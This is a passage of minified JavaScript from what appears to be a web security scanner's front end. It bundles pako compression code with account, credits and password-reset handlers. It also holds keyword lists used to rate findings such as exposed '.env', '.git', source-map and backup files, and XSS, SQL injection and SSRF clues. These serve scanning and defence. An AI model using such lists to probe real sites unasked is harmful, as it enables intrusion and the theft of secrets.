e;q--,B+=A[N++]<<I,I+=8}E.adler=l.check=b(B),I=B=0,l.mode=11;case 11:if(l.havedict===0)return E.next_out=U,E.avail_out=te,E.next_in=N,E.avail_in=q,l.hold=B,l.bits=I,2;E.adler=l.check=1,l.mode=12;case 12:if(H===5||H===6)break e;case 13:if(l.last){B>>>=7&I,I-=7&I,l.mode=27;break}for(;I<3;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}switch(l.last=1&B,I-=1,3&(B>>>=1)){case 0:l.mode=14;break;case 1:if(D(l),l.mode=20,H!==6)break;B>>>=2,I-=2;break e;case 2:l.mode=17;break;case 3:E.msg="invalid block type",l.mode=30}B>>>=2,I-=2;break;case 14:for(B>>>=7&I,I-=7&I;I<32;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}if((65535&B)!=(B>>>16^65535)){E.msg="invalid stored block lengths",l.mode=30;break}if(l.length=65535&B,I=B=0,l.mode=15,H===6)break e;case 15:l.mode=16;case 16:if(X=l.length){if(q<X&&(X=q),te<X&&(X=te),X===0)break e;o.arraySet(J,A,N,X,U),q-=X,N+=X,te-=X,U+=X,l.length-=X;break}l.mode=12;break;case 17:for(;I<14;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}if(l.nlen=257+(31&B),B>>>=5,I-=5,l.ndist=1+(31&B),B>>>=5,I-=5,l.ncode=4+(15&B),B>>>=4,I-=4,286<l.nlen||30<l.ndist){E.msg="too many length or distance symbols",l.mode=30;break}l.have=0,l.mode=18;case 18:for(;l.have<l.ncode;){for(;I<3;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}l.lens[W[l.have++]]=7&B,B>>>=3,I-=3}for(;l.have<19;)l.lens[W[l.have++]]=0;if(l.lencode=l.lendyn,l.lenbits=7,F={bits:l.lenbits},$=f(0,l.lens,0,19,l.lencode,0,l.work,F),l.lenbits=F.bits,$){E.msg="invalid code lengths set",l.mode=30;break}l.have=0,l.mode=19;case 19:for(;l.have<l.nlen+l.ndist;){for(;oe=(w=l.lencode[B&(1<<l.lenbits)-1])>>>16&255,ne=65535&w,!((ae=w>>>24)<=I);){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}if(ne<16)B>>>=ae,I-=ae,l.lens[l.have++]=ne;else{if(ne===16){for(_=ae+2;I<_;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}if(B>>>=ae,I-=ae,l.have===0){E.msg="invalid bit length repeat",l.mode=30;break}u=l.lens[l.have-1],X=3+(3&B),B>>>=2,I-=2}else if(ne===17){for(_=ae+3;I<_;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}I-=ae,u=0,X=3+(7&(B>>>=ae)),B>>>=3,I-=3}else{for(_=ae+7;I<_;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}I-=ae,u=0,X=11+(127&(B>>>=ae)),B>>>=7,I-=7}if(l.have+X>l.nlen+l.ndist){E.msg="invalid bit length repeat",l.mode=30;break}for(;X--;)l.lens[l.have++]=u}}if(l.mode===30)break;if(l.lens[256]===0){E.msg="invalid code -- missing end-of-block",l.mode=30;break}if(l.lenbits=9,F={bits:l.lenbits},$=f(v,l.lens,0,l.nlen,l.lencode,0,l.work,F),l.lenbits=F.bits,$){E.msg="invalid literal/lengths set",l.mode=30;break}if(l.distbits=6,l.distcode=l.distdyn,F={bits:l.distbits},$=f(c,l.lens,l.nlen,l.ndist,l.distcode,0,l.work,F),l.distbits=F.bits,$){E.msg="invalid distances set",l.mode=30;break}if(l.mode=20,H===6)break e;case 20:l.mode=21;case 21:if(6<=q&&258<=te){E.next_out=U,E.avail_out=te,E.next_in=N,E.avail_in=q,l.hold=B,l.bits=I,d(E,K),U=E.next_out,J=E.output,te=E.avail_out,N=E.next_in,A=E.input,q=E.avail_in,B=l.hold,I=l.bits,l.mode===12&&(l.back=-1);break}for(l.back=0;oe=(w=l.lencode[B&(1<<l.lenbits)-1])>>>16&255,ne=65535&w,!((ae=w>>>24)<=I);){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}if(oe&&(240&oe)==0){for(le=ae,we=oe,ze=ne;oe=(w=l.lencode[ze+((B&(1<<le+we)-1)>>le)])>>>16&255,ne=65535&w,!(le+(ae=w>>>24)<=I);){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}B>>>=le,I-=le,l.back+=le}if(B>>>=ae,I-=ae,l.back+=ae,l.length=ne,oe===0){l.mode=26;break}if(32&oe){l.back=-1,l.mode=12;break}if(64&oe){E.msg="invalid literal/length code",l.mode=30;break}l.extra=15&oe,l.mode=22;case 22:if(l.extra){for(_=l.extra;I<_;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}l.length+=B&(1<<l.extra)-1,B>>>=l.extra,I-=l.extra,l.back+=l.extra}l.was=l.length,l.mode=23;case 23:for(;oe=(w=l.distcode[B&(1<<l.distbits)-1])>>>16&255,ne=65535&w,!((ae=w>>>24)<=I);){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}if((240&oe)==0){for(le=ae,we=oe,ze=ne;oe=(w=l.distcode[ze+((B&(1<<le+we)-1)>>le)])>>>16&255,ne=65535&w,!(le+(ae=w>>>24)<=I);){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}B>>>=le,I-=le,l.back+=le}if(B>>>=ae,I-=ae,l.back+=ae,64&oe){E.msg="invalid distance code",l.mode=30;break}l.offset=ne,l.extra=15&oe,l.mode=24;case 24:if(l.extra){for(_=l.extra;I<_;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}l.offset+=B&(1<<l.extra)-1,B>>>=l.extra,I-=l.extra,l.back+=l.extra}if(l.offset>l.dmax){E.msg="invalid distance too far back",l.mode=30;break}l.mode=25;case 25:if(te===0)break e;if(X=K-te,l.offset>X){if((X=l.offset-X)>l.whave&&l.sane){E.msg="invalid distance too far back",l.mode=30;break}ge=X>l.wnext?(X-=l.wnext,l.wsize-X):l.wnext-X,X>l.length&&(X=l.length),re=l.window}else re=J,ge=U-l.offset,X=l.length;for(te<X&&(X=te),te-=X,l.length-=X;J[U++]=re[ge++],--X;);l.length===0&&(l.mode=21);break;case 26:if(te===0)break e;J[U++]=l.length,te--,l.mode=21;break;case 27:if(l.wrap){for(;I<32;){if(q===0)break e;q--,B|=A[N++]<<I,I+=8}if(K-=te,E.total_out+=K,l.total+=K,K&&(E.adler=l.check=l.flags?n(l.check,J,K,U-K):a(l.check,J,K,U-K)),K=te,(l.flags?B:b(B))!==l.check){E.msg="incorrect data check",l.mode=30;break}I=B=0}l.mode=28;case 28:if(l.wrap&&l.flags){for(;I<32;){if(q===0)break e;q--,B+=A[N++]<<I,I+=8}if(B!==(4294967295&l.total)){E.msg="incorrect length check",l.mode=30;break}I=B=0}l.mode=29;case 29:$=1;break e;case 30:$=-3;break e;case 31:return-4;case 32:default:return h}return E.next_out=U,E.avail_out=te,E.next_in=N,E.avail_in=q,l.hold=B,l.bits=I,(l.wsize||K!==E.avail_out&&l.mode<30&&(l.mode<27||H!==4))&&Y(E,E.output,E.next_out,K-E.avail_out)?(l.mode=31,-4):(ee-=E.avail_in,K-=E.avail_out,E.total_in+=ee,E.total_out+=K,l.total+=K,l.wrap&&K&&(E.adler=l.check=l.flags?n(l.check,J,K,E.next_out-K):a(l.check,J,K,E.next_out-K)),E.data_type=l.bits+(l.last?64:0)+(l.mode===12?128:0)+(l.mode===20||l.mode===15?256:0),(ee==0&&K===0||H===4)&&$===p&&($=-5),$)},r.inflateEnd=function(E){if(!E||!E.state)return h;var H=E.state;return H.window&&(H.window=null),E.state=null,p},r.inflateGetHeader=function(E,H){var l;return E&&E.state?(2&(l=E.state).wrap)==0?h:((l.head=H).done=!1,p):h},r.inflateSetDictionary=function(E,H){var l,A=H.length;return E&&E.state?(l=E.state).wrap!==0&&l.mode!==11?h:l.mode===11&&a(1,H,A,0)!==l.check?-3:Y(E,H,A,A)?(l.mode=31,-4):(l.havedict=1,p):h},r.inflateInfo="pako inflate (from Nodeca project)"},{"../utils/common":41,"./adler32":43,"./crc32":45,"./inffast":48,"./inftrees":50}],50:[function(t,s,r){var o=t("../utils/common"),a=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,0,0],n=[16,16,16,16,16,16,16,16,17,17,17,17,18,18,18,18,19,19,19,19,20,20,20,20,21,21,21,21,16,72,78],d=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577,0,0],f=[16,16,16,16,17,17,18,18,19,19,20,20,21,21,22,22,23,23,24,24,25,25,26,26,27,27,28,28,29,29,64,64];s.exports=function(v,c,p,h,m,g,y,b){var k,x,C,z,P,R,j,M,D,Y=b.bits,E=0,H=0,l=0,A=0,J=0,N=0,U=0,q=0,te=0,B=0,I=null,ee=0,K=new o.Buf16(16),X=new o.Buf16(16),ge=null,re=0;for(E=0;E<=15;E++)K[E]=0;for(H=0;H<h;H++)K[c[p+H]]++;for(J=Y,A=15;1<=A&&K[A]===0;A--);if(A<J&&(J=A),A===0)return m[g++]=20971520,m[g++]=20971520,b.bits=1,0;for(l=1;l<A&&K[l]===0;l++);for(J<l&&(J=l),E=q=1;E<=15;E++)if(q<<=1,(q-=K[E])<0)return-1;if(0<q&&(v===0||A!==1))return-1;for(X[1]=0,E=1;E<15;E++)X[E+1]=X[E]+K[E];for(H=0;H<h;H++)c[p+H]!==0&&(y[X[c[p+H]]++]=H);if(R=v===0?(I=ge=y,19):v===1?(I=a,ee-=257,ge=n,re-=257,256):(I=d,ge=f,-1),E=l,P=g,U=H=B=0,C=-1,z=(te=1<<(N=J))-1,v===1&&852<te||v===2&&592<te)return 1;for(;;){for(j=E-U,D=y[H]<R?(M=0,y[H]):y[H]>R?(M=ge[re+y[H]],I[ee+y[H]]):(M=96,0),k=1<<E-U,l=x=1<<N;m[P+(B>>U)+(x-=k)]=j<<24|M<<16|D|0,x!==0;);for(k=1<<E-1;B&k;)k>>=1;if(k!==0?(B&=k-1,B+=k):B=0,H++,--K[E]==0){if(E===A)break;E=c[p+y[H]]}if(J<E&&(B&z)!==C){for(U===0&&(U=J),P+=l,q=1<<(N=E-U);N+U<A&&!((q-=K[N+U])<=0);)N++,q<<=1;if(te+=1<<N,v===1&&852<te||v===2&&592<te)return 1;m[C=B&z]=J<<24|N<<16|P-g|0}}return B!==0&&(m[P+B]=E-U<<24|64<<16|0),b.bits=J,0}},{"../utils/common":41}],51:[function(t,s,r){s.exports={2:"need dictionary",1:"stream end",0:"","-1":"file error","-2":"stream error","-3":"data error","-4":"insufficient memory","-5":"buffer error","-6":"incompatible version"}},{}],52:[function(t,s,r){var o=t("../utils/common"),a=0,n=1;function d(w){for(var T=w.length;0<=--T;)w[T]=0}var f=0,v=29,c=256,p=c+1+v,h=30,m=19,g=2*p+1,y=15,b=16,k=7,x=256,C=16,z=17,P=18,R=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0],j=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],M=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,3,7],D=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],Y=new Array(2*(p+2));d(Y);var E=new Array(2*h);d(E);var H=new Array(512);d(H);var l=new Array(256);d(l);var A=new Array(v);d(A);var J,N,U,q=new Array(h);function te(w,T,W,Z,O){this.static_tree=w,this.extra_bits=T,this.extra_base=W,this.elems=Z,this.max_length=O,this.has_stree=w&&w.length}function B(w,T){this.dyn_tree=w,this.max_code=0,this.stat_desc=T}function I(w){return w<256?H[w]:H[256+(w>>>7)]}function ee(w,T){w.pending_buf[w.pending++]=255&T,w.pending_buf[w.pending++]=T>>>8&255}function K(w,T,W){w.bi_valid>b-W?(w.bi_buf|=T<<w.bi_valid&65535,ee(w,w.bi_buf),w.bi_buf=T>>b-w.bi_valid,w.bi_valid+=W-b):(w.bi_buf|=T<<w.bi_valid&65535,w.bi_valid+=W)}function X(w,T,W){K(w,W[2*T],W[2*T+1])}function ge(w,T){for(var W=0;W|=1&w,w>>>=1,W<<=1,0<--T;);return W>>>1}function re(w,T,W){var Z,O,V=new Array(y+1),Q=0;for(Z=1;Z<=y;Z++)V[Z]=Q=Q+W[Z-1]<<1;for(O=0;O<=T;O++){var G=w[2*O+1];G!==0&&(w[2*O]=ge(V[G]++,G))}}function ae(w){var T;for(T=0;T<p;T++)w.dyn_ltree[2*T]=0;for(T=0;T<h;T++)w.dyn_dtree[2*T]=0;for(T=0;T<m;T++)w.bl_tree[2*T]=0;w.dyn_ltree[2*x]=1,w.opt_len=w.static_len=0,w.last_lit=w.matches=0}function oe(w){8<w.bi_valid?ee(w,w.bi_buf):0<w.bi_valid&&(w.pending_buf[w.pending++]=w.bi_buf),w.bi_buf=0,w.bi_valid=0}function ne(w,T,W,Z){var O=2*T,V=2*W;return w[O]<w[V]||w[O]===w[V]&&Z[T]<=Z[W]}function le(w,T,W){for(var Z=w.heap[W],O=W<<1;O<=w.heap_len&&(O<w.heap_len&&ne(T,w.heap[O+1],w.heap[O],w.depth)&&O++,!ne(T,Z,w.heap[O],w.depth));)w.heap[W]=w.heap[O],W=O,O<<=1;w.heap[W]=Z}function we(w,T,W){var Z,O,V,Q,G=0;if(w.last_lit!==0)for(;Z=w.pending_buf[w.d_buf+2*G]<<8|w.pending_buf[w.d_buf+2*G+1],O=w.pending_buf[w.l_buf+G],G++,Z===0?X(w,O,T):(X(w,(V=l[O])+c+1,T),(Q=R[V])!==0&&K(w,O-=A[V],Q),X(w,V=I(--Z),W),(Q=j[V])!==0&&K(w,Z-=q[V],Q)),G<w.last_lit;);X(w,x,T)}function ze(w,T){var W,Z,O,V=T.dyn_tree,Q=T.stat_desc.static_tree,G=T.stat_desc.has_stree,se=T.stat_desc.elems,he=-1;for(w.heap_len=0,w.heap_max=g,W=0;W<se;W++)V[2*W]!==0?(w.heap[++w.heap_len]=he=W,w.depth[W]=0):V[2*W+1]=0;for(;w.heap_len<2;)V[2*(O=w.heap[++w.heap_len]=he<2?++he:0)]=1,w.depth[O]=0,w.opt_len--,G&&(w.static_len-=Q[2*O+1]);for(T.max_code=he,W=w.heap_len>>1;1<=W;W--)le(w,V,W);for(O=se;W=w.heap[1],w.heap[1]=w.heap[w.heap_len--],le(w,V,1),Z=w.heap[1],w.heap[--w.heap_max]=W,w.heap[--w.heap_max]=Z,V[2*O]=V[2*W]+V[2*Z],w.depth[O]=(w.depth[W]>=w.depth[Z]?w.depth[W]:w.depth[Z])+1,V[2*W+1]=V[2*Z+1]=O,w.heap[1]=O++,le(w,V,1),2<=w.heap_len;);w.heap[--w.heap_max]=w.heap[1],(function(pe,Ce){var gt,Me,ht,ye,Ct,ei,He=Ce.dyn_tree,Ai=Ce.max_code,Qn=Ce.stat_desc.static_tree,er=Ce.stat_desc.has_stree,tr=Ce.stat_desc.extra_bits,Bi=Ce.stat_desc.extra_base,vt=Ce.stat_desc.max_length,Tt=0;for(ye=0;ye<=y;ye++)pe.bl_count[ye]=0;for(He[2*pe.heap[pe.heap_max]+1]=0,gt=pe.heap_max+1;gt<g;gt++)vt<(ye=He[2*He[2*(Me=pe.heap[gt])+1]+1]+1)&&(ye=vt,Tt++),He[2*Me+1]=ye,Ai<Me||(pe.bl_count[ye]++,Ct=0,Bi<=Me&&(Ct=tr[Me-Bi]),ei=He[2*Me],pe.opt_len+=ei*(ye+Ct),er&&(pe.static_len+=ei*(Qn[2*Me+1]+Ct)));if(Tt!==0){do{for(ye=vt-1;pe.bl_count[ye]===0;)ye--;pe.bl_count[ye]--,pe.bl_count[ye+1]+=2,pe.bl_count[vt]--,Tt-=2}while(0<Tt);for(ye=vt;ye!==0;ye--)for(Me=pe.bl_count[ye];Me!==0;)Ai<(ht=pe.heap[--gt])||(He[2*ht+1]!==ye&&(pe.opt_len+=(ye-He[2*ht+1])*He[2*ht],He[2*ht+1]=ye),Me--)}})(w,T),re(V,he,w.bl_count)}function u(w,T,W){var Z,O,V=-1,Q=T[1],G=0,se=7,he=4;for(Q===0&&(se=138,he=3),T[2*(W+1)+1]=65535,Z=0;Z<=W;Z++)O=Q,Q=T[2*(Z+1)+1],++G<se&&O===Q||(G<he?w.bl_tree[2*O]+=G:O!==0?(O!==V&&w.bl_tree[2*O]++,w.bl_tree[2*C]++):G<=10?w.bl_tree[2*z]++:w.bl_tree[2*P]++,V=O,he=(G=0)===Q?(se=138,3):O===Q?(se=6,3):(se=7,4))}function $(w,T,W){var Z,O,V=-1,Q=T[1],G=0,se=7,he=4;for(Q===0&&(se=138,he=3),Z=0;Z<=W;Z++)if(O=Q,Q=T[2*(Z+1)+1],!(++G<se&&O===Q)){if(G<he)for(;X(w,O,w.bl_tree),--G!=0;);else O!==0?(O!==V&&(X(w,O,w.bl_tree),G--),X(w,C,w.bl_tree),K(w,G-3,2)):G<=10?(X(w,z,w.bl_tree),K(w,G-3,3)):(X(w,P,w.bl_tree),K(w,G-11,7));V=O,he=(G=0)===Q?(se=138,3):O===Q?(se=6,3):(se=7,4)}}d(q);var F=!1;function _(w,T,W,Z){K(w,(f<<1)+(Z?1:0),3),(function(O,V,Q,G){oe(O),ee(O,Q),ee(O,~Q),o.arraySet(O.pending_buf,O.window,V,Q,O.pending),O.pending+=Q})(w,T,W)}r._tr_init=function(w){F||((function(){var T,W,Z,O,V,Q=new Array(y+1);for(O=Z=0;O<v-1;O++)for(A[O]=Z,T=0;T<1<<R[O];T++)l[Z++]=O;for(l[Z-1]=O,O=V=0;O<16;O++)for(q[O]=V,T=0;T<1<<j[O];T++)H[V++]=O;for(V>>=7;O<h;O++)for(q[O]=V<<7,T=0;T<1<<j[O]-7;T++)H[256+V++]=O;for(W=0;W<=y;W++)Q[W]=0;for(T=0;T<=143;)Y[2*T+1]=8,T++,Q[8]++;for(;T<=255;)Y[2*T+1]=9,T++,Q[9]++;for(;T<=279;)Y[2*T+1]=7,T++,Q[7]++;for(;T<=287;)Y[2*T+1]=8,T++,Q[8]++;for(re(Y,p+1,Q),T=0;T<h;T++)E[2*T+1]=5,E[2*T]=ge(T,5);J=new te(Y,R,c+1,p,y),N=new te(E,j,0,h,y),U=new te(new Array(0),M,0,m,k)})(),F=!0),w.l_desc=new B(w.dyn_ltree,J),w.d_desc=new B(w.dyn_dtree,N),w.bl_desc=new B(w.bl_tree,U),w.bi_buf=0,w.bi_valid=0,ae(w)},r._tr_stored_block=_,r._tr_flush_block=function(w,T,W,Z){var O,V,Q=0;0<w.level?(w.strm.data_type===2&&(w.strm.data_type=(function(G){var se,he=4093624447;for(se=0;se<=31;se++,he>>>=1)if(1&he&&G.dyn_ltree[2*se]!==0)return a;if(G.dyn_ltree[18]!==0||G.dyn_ltree[20]!==0||G.dyn_ltree[26]!==0)return n;for(se=32;se<c;se++)if(G.dyn_ltree[2*se]!==0)return n;return a})(w)),ze(w,w.l_desc),ze(w,w.d_desc),Q=(function(G){var se;for(u(G,G.dyn_ltree,G.l_desc.max_code),u(G,G.dyn_dtree,G.d_desc.max_code),ze(G,G.bl_desc),se=m-1;3<=se&&G.bl_tree[2*D[se]+1]===0;se--);return G.opt_len+=3*(se+1)+5+5+4,se})(w),O=w.opt_len+3+7>>>3,(V=w.static_len+3+7>>>3)<=O&&(O=V)):O=V=W+5,W+4<=O&&T!==-1?_(w,T,W,Z):w.strategy===4||V===O?(K(w,2+(Z?1:0),3),we(w,Y,E)):(K(w,4+(Z?1:0),3),(function(G,se,he,pe){var Ce;for(K(G,se-257,5),K(G,he-1,5),K(G,pe-4,4),Ce=0;Ce<pe;Ce++)K(G,G.bl_tree[2*D[Ce]+1],3);$(G,G.dyn_ltree,se-1),$(G,G.dyn_dtree,he-1)})(w,w.l_desc.max_code+1,w.d_desc.max_code+1,Q+1),we(w,w.dyn_ltree,w.dyn_dtree)),ae(w),Z&&oe(w)},r._tr_tally=function(w,T,W){return w.pending_buf[w.d_buf+2*w.last_lit]=T>>>8&255,w.pending_buf[w.d_buf+2*w.last_lit+1]=255&T,w.pending_buf[w.l_buf+w.last_lit]=255&W,w.last_lit++,T===0?w.dyn_ltree[2*W]++:(w.matches++,T--,w.dyn_ltree[2*(l[W]+c+1)]++,w.dyn_dtree[2*I(T)]++),w.last_lit===w.lit_bufsize-1},r._tr_align=function(w){K(w,2,3),X(w,x,Y),(function(T){T.bi_valid===16?(ee(T,T.bi_buf),T.bi_buf=0,T.bi_valid=0):8<=T.bi_valid&&(T.pending_buf[T.pending++]=255&T.bi_buf,T.bi_buf>>=8,T.bi_valid-=8)})(w)}},{"../utils/common":41}],53:[function(t,s,r){s.exports=function(){this.input=null,this.next_in=0,this.avail_in=0,this.total_in=0,this.output=null,this.next_out=0,this.avail_out=0,this.total_out=0,this.msg="",this.state=null,this.data_type=2,this.adler=0}},{}],54:[function(t,s,r){(function(o){(function(a,n){if(!a.setImmediate){var d,f,v,c,p=1,h={},m=!1,g=a.document,y=Object.getPrototypeOf&&Object.getPrototypeOf(a);y=y&&y.setTimeout?y:a,d={}.toString.call(a.process)==="[object process]"?function(C){process.nextTick(function(){k(C)})}:(function(){if(a.postMessage&&!a.importScripts){var C=!0,z=a.onmessage;return a.onmessage=function(){C=!1},a.postMessage("","*"),a.onmessage=z,C}})()?(c="setImmediate$"+Math.random()+"$",a.addEventListener?a.addEventListener("message",x,!1):a.attachEvent("onmessage",x),function(C){a.postMessage(c+C,"*")}):a.MessageChannel?((v=new MessageChannel).port1.onmessage=function(C){k(C.data)},function(C){v.port2.postMessage(C)}):g&&"onreadystatechange"in g.createElement("script")?(f=g.documentElement,function(C){var z=g.createElement("script");z.onreadystatechange=function(){k(C),z.onreadystatechange=null,f.removeChild(z),z=null},f.appendChild(z)}):function(C){setTimeout(k,0,C)},y.setImmediate=function(C){typeof C!="function"&&(C=new Function(""+C));for(var z=new Array(arguments.length-1),P=0;P<z.length;P++)z[P]=arguments[P+1];var R={callback:C,args:z};return h[p]=R,d(p),p++},y.clearImmediate=b}function b(C){delete h[C]}function k(C){if(m)setTimeout(k,0,C);else{var z=h[C];if(z){m=!0;try{(function(P){var R=P.callback,j=P.args;switch(j.length){case 0:R();break;case 1:R(j[0]);break;case 2:R(j[0],j[1]);break;case 3:R(j[0],j[1],j[2]);break;default:R.apply(n,j)}})(z)}finally{b(C),m=!1}}}}function x(C){C.source===a&&typeof C.data=="string"&&C.data.indexOf(c)===0&&k(+C.data.slice(c.length))}})(typeof self>"u"?o===void 0?this:o:self)}).call(this,typeof At<"u"?At:typeof self<"u"?self:typeof window<"u"?window:{})},{}]},{},[10])(10)})})(ti)),ti.exports}var Xr=Zr();const Vr=Wr(Xr);function Gr(e){let i=document.getElementById("auth-guest"),t=document.getElementById("auth-register"),s=document.getElementById("auth-reset"),r=document.getElementById("auth-logged");i&&(i.style.display="block"),t&&(t.style.display="none"),s&&(s.style.display="none"),r&&(r.style.display="none")}function di(e){if(e==null)return"--";let i=parseInt(e,10);return isNaN(i)?String(e):i.toLocaleString("zh-CN")}function Fe(){return ve()?ur().then(function(e){let i=e&&e.success&&e.data&&typeof e.data.credits=="number"?e.data.credits:e&&typeof e.credits=="number"?e.credits:null;at("user-credits","额度："+di(i));let t=document.getElementById("credits-balance");return t&&(t.textContent=di(i)),i}).catch(function(){at("user-credits","额度：--")}):(at("user-credits","额度：--"),Promise.resolve(null))}function mi(e){e=parseInt(e,10)||1;let i=10,t=(e-1)*i,s=document.getElementById("credits-usage-list");s&&(s.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取使用记录...</div>'),Fe(),fr(i,t).then(function(r){let o=r&&r.data&&r.data.logs||r&&r.logs||[],a=r&&r.data&&r.data.total||r&&r.total||o.length,n=r&&r.meta||{},d=n.limit||i,f=n.offset||t,v=Math.floor(f/d)+1,c=Math.max(1,Math.ceil(a/d));Jr(o),gi("credits-pagination",v,c,function(p){mi(p)}),$e("credits-pagination",c>1?"flex":"none")}).catch(function(r){s&&(s.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">读取使用记录失败</div>')})}function Jr(e){let i=document.getElementById("credits-usage-list");if(!i)return;if(!e||e.length===0){i.innerHTML='<div style="text-align:center;padding:24px;color:var(--text-secondary)">近 30 天内没有额度变动记录</div>';return}let t='<div style="display:flex;flex-direction:column;gap:8px">';e.forEach(function(s){let r=s.amount||0,o=r<0?"var(--danger)":"var(--success)",a=(r>0?"+":"")+r;t+='<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px">',t+="<div>",t+='<div style="font-size:13px;font-weight:600">'+S(s.action||"额度变动")+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">'+Gt(s.created_at)+"</div>",t+="</div>",t+='<div style="text-align:right">',t+='<div style="font-size:13px;font-weight:700;color:'+o+'">'+a+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">余额 '+di(s.balance_after)+"</div>",t+="</div></div>"}),t+="</div>",i.innerHTML=t}typeof window<"u"&&(window.doResetPassword=function(){let e=document.getElementById("reset-password-token"),i=document.getElementById("reset-new-password"),t=document.getElementById("reset-new-password2"),s=e?e.value.trim():"",r=i?i.value.trim():"",o=t?t.value.trim():"";if(!s){L("请输入重置 令牌");return}if(!r||r.length<6){L("新密码至少 6 个字符");return}if(r!==o){L("两次密码不一致");return}Xe("/api/auth/password-reset/confirm",{token:s,new_password:r}).then(function(a){a&&a.success?(L("密码重置成功，请重新登录"),Gr()):L(Ue(a)||"密码重置失败")}).catch(function(a){L("密码重置失败："+a.message)})},window.doResendVerification=function(){resendVerification().then(function(e){L(e&&e.message||"验证邮件已重新发送")}).catch(function(e){L("重新发送失败："+e.message)})},window.doVerifyEmailFromToken=function(){let e=document.getElementById("verify-email-token"),i=e?e.value.trim():"";if(!i){L("请输入邮箱验证 令牌");return}Xe("/api/auth/verify-email",{token:i}).then(function(t){t&&t.success?L("邮箱验证成功"):L(Ue(t)||"邮箱验证失败")}).catch(function(t){L("邮箱验证失败："+t.message)})});typeof window<"u"&&(window.refreshAuthChallenge=window.refreshAuthChallenge||function(){});const dn=["源码","source map",".map","目录索引","目录遍历","路径遍历","敏感文件","泄露","注释","debug","backup","备份","phpinfo",".git",".env","source","map","index of","listing","xss","sql 注入","sqli","ssrf","open redirect","重定向","登录态","权限","csrf","idor","traversal","弱口令","防爆破","cookie","waf"],Kr=new Set(["path","url","snippet","body_hint","method","detected","header","value","reason","impact","limitation"]);function Se(e){return String(e||"").toLowerCase()}function cn(e){return[e&&e.name,e&&e.title,e&&e.summary,e&&e.description,e&&e.type,e&&e.category,e&&e.evidence_text,e&&e.evidence_html,e&&e.evidence&&JSON.stringify(e.evidence)].filter(Boolean).join(" ")}function pn(e){if(!e||typeof e!="object")return!1;const i=e.evidence&&typeof e.evidence=="object"?e.evidence:null;return i?Object.keys(i).some(t=>Kr.has(t)&&i[t]!==void 0&&i[t]!==null&&String(i[t]).trim()!==""):!1}function un(e){if(!e||typeof e!="object")return!1;const i=e.evidence&&typeof e.evidence=="object"?e.evidence:null;if(!i)return!1;const t=Object.values(i).filter(Boolean).map(s=>String(s).toLowerCase()).join(" ");return t?["sourcemappingurl","source map",".map",".env",".git",".svn",".bak","backup","dump","phpinfo","index of","directory listing","目录索引","敏感文件","源码泄露","注释","debug"].some(s=>t.includes(s)):!1}function Yr(e){if(!e||typeof e!="object")return"low";const i=Se(cn(e)),t=e.evidence&&typeof e.evidence=="object"?e.evidence:null,s=Se(e.severity),r=un(e),o=pn(e),a=dn.some(n=>i.includes(n));return r?"high":o&&a||(s==="high"||s==="critical")&&a?"medium":t&&(Se(t.path).includes(".env")||Se(t.path).includes(".git")||Se(t.path).includes(".map")||Se(t.url).includes(".env")||Se(t.url).includes(".git")||Se(t.url).includes(".map"))?"high":(a&&(i.includes("source")||i.includes("泄露")||i.includes("敏感")),"low")}function Qr(e){if(!e||typeof e!="object")return!1;const i=Se(cn(e)),t=e.evidence&&typeof e.evidence=="object"?e.evidence:null,s=Se(e.type)||Se(e.category),r=dn.some(n=>i.includes(n)),o=pn(e);return!!(un(e)||o&&r||(s==="exposed"||s==="exposure"||s==="sensitive"||s==="leak")&&(r||t)||(Se(e.name).includes("源码")||Se(e.name).includes("敏感文件")||Se(e.name).includes("源码泄露"))&&o)}function es(e){return(Array.isArray(e)?e:[]).filter(Qr).map(i=>({...i,confidence:Yr(i)})).sort((i,t)=>{const s={high:3,medium:2,low:1},r=(s[t.confidence]||0)-(s[i.confidence]||0);if(r!==0)return r;const o={critical:4,high:3,medium:2,low:1,info:0};return(o[t.severity]||0)-(o[i.severity]||0)})}function ts(e){const i={high:0,medium:0,low:0};return(Array.isArray(e)?e:[]).forEach(t=>{const s=String(t&&t.confidence||"low").toLowerCase();i[s]!==void 0&&(i[s]+=1)}),i}function ji(){return["源码映射文件","目录索引与备份文件","HTML 注释与调试信息","敏感配置与暴露路径","登录态与权限控制","重定向与路径校验","弱口令与防爆破","XSS / SQL 注入 / SSRF 线索","基础安全响应头"]}function Ee(...e){return window.navigateTo(...e)}let de=null,qe=null,fn="nginx",be=!1,Kt=1,ii=5,xt="",Wt="",Ie=!1,st=null,De=null,Oe=null,Ae=[],Te=0,Lt=0,Hi=["正在初始化扫描引擎...","DNS 域名解析中...","建立 TCP 连接...","发送 HTTP 请求...","检查响应头安全配置...","检查 HSTS 配置...","检查 CSP 内容安全策略...","检查 X-Frame-Options...","检查 X-Content-Type-Options...","检查 Referrer-Policy...","检查 Permissions-Policy...","检测 SSL/TLS 